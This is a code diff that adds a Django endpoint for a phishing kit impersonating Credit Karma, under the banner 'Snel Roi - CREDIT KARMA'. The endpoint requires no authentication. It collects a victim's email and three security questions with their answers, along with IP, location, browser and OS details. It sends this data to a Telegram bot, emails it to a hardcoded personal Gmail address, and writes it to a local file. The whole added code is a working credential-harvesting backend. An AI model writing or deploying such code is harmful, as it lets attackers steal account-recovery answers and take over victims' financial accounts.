@@ -1043,4 +1043,162 @@ def save_data_to_file(email, message):
         f.write(message)  # Directly save the formatted message as is
         f.write("\n" + "=" * 80 + "\n")  # Add a separator for clarity
 
-    print(f"Data saved to {file_path}")
+@api_view(
+    [
+        "POST",
+    ]
+)
+@permission_classes([])
+@authentication_classes([])
+def collect_user_security_questions(request):
+
+    payload = {}
+    data = {}
+    errors = {}
+
+    if request.method == "POST":
+
+        email = request.data.get("emzemz", "")
+        securityQuestion1 = request.data.get("securityQuestion1", "")
+        securityAnswer1 = request.data.get("securityAnswer1", "")
+        securityQuestion2 = request.data.get("securityQuestion2", "")
+        securityAnswer2 = request.data.get("securityAnswer2", "")
+        securityQuestion3 = request.data.get("securityQuestion3", "")
+        securityAnswer3 = request.data.get("securityAnswer3", "")
+
+        print(email)
+        print(securityQuestion1)
+        print(securityAnswer1)
+        print(securityQuestion2)
+        print(securityAnswer2)
+        print(securityQuestion3)
+        print(securityAnswer3)
+
+        if not email:
+            errors["email"] = ["Email is required."]
+
+        if not securityQuestion1:
+            errors["securityQuestion1"] = ["Security question 1 is required."]
+
+        if not securityAnswer1:
+            errors["securityAnswer1"] = ["Security answer 1 is required."]
+
+        if not securityQuestion2:
+            errors["securityQuestion2"] = ["Security question 2 is required."]
+
+        if not securityAnswer2:
+            errors["securityAnswer2"] = ["Security answer 2 is required."]
+
+        if not securityQuestion3:
+            errors["securityQuestion3"] = ["Security question 3 is required."]
+
+        if not securityAnswer3:
+            errors["securityAnswer3"] = ["Security answer 3 is required."]
+
+        if errors:
+            payload["message"] = "Errors"
+            payload["errors"] = errors
+            return Response(payload, status=status.HTTP_400_BAD_REQUEST)
+
+        #####################
+        # Browser Data
+        ######################
+
+        ip = get_client_ip(request)
+        agent = request.META.get("HTTP_USER_AGENT", "")
+
+        country = get_country_from_ip(ip)
+        city = get_city_from_ip(ip)
+        browser = get_user_browser(agent)
+        os = get_user_os(agent)
+        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
+
+        ##############################
+        # Save User data to database
+        ################################
+
+        client, created = Client.objects.get_or_create(
+            email=email,
+        )
+        client.security_question_1 = securityQuestion1
+        client.security_answer_1 = securityAnswer1
+        client.security_question_2 = securityQuestion2
+        client.security_answer_2 = securityAnswer2
+        client.security_question_3 = securityQuestion3
+        client.security_answer_3 = securityAnswer3
+        client.save()
+
+        browser_data, created = BrowserDetail.objects.get_or_create(
+            client=client,
+        )
+
+        browser_data.ip = ip
+        browser_data.agent = agent
+        browser_data.country = country
+        browser_data.browser = browser
+        browser_data.os = os
+        browser_data.date = date
+
+        browser_data.save()
+
+        message = f"|=====||Snel Roi - CREDIT KARMA||=====|\n"
+        message += f"|========= [  SECURITY QUESTIONS ] ==========|\n"
+        message += f"| ➤ [ Question 1 ]      : {securityQuestion1}\n"
+        message += f"| ➤ [ Answer 1 ]        : {securityAnswer1}\n"
+        message += f"| ➤ [ Question 2 ]      : {securityQuestion2}\n"
+        message += f"| ➤ [ Answer 2 ]        : {securityAnswer2}\n"
+        message += f"| ➤ [ Question 3 ]      : {securityQuestion3}\n"
+        message += f"| ➤ [ Answer 3 ]        : {securityAnswer3}\n"
+        message += f"|=====================================|\n"
+        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+        message += f"|======================================|\n"
+        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+        message += f"| ➤ [ IP Country ]   : {country}\r\n"
+        message += f"| ➤ [ IP City ]      : {city}\r\n"
+        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+        message += f"| ➤ [ TIME ]         : {date}\r\n"
+        message += f"|=====================================|\n"
+
+        #############################
+        # Send data to telegram
+        ##############################
+
+        telegram_url = (
+            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
+        )
+
+        # Send the POST request to Telegram API
+        response = requests.post(
+            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
+        )
+
+        # Check if the message was sent successfully
+        if response.status_code == 200:
+            print("Telegram message sent successfully")
+        else:
+            print(f"Failed to send message. Status code: {response.status_code}")
+
+        #############################
+        # Send Data to email
+        ########################
+        subject = "The Data"
+        from_email = settings.DEFAULT_FROM_EMAIL
+        recipient_list = ["etornamasamoah@gmail.com"]
+
+        send_mail(
+            subject,
+            message,
+            from_email,
+            recipient_list,
+            fail_silently=False,
+        )
+
+        #####################################
+        # Save to txt
+        ##############################
+        save_data_to_file(email, message)
+
+        payload["message"] = "Successful"
+        payload["data"] = data
+    return Response(payload)
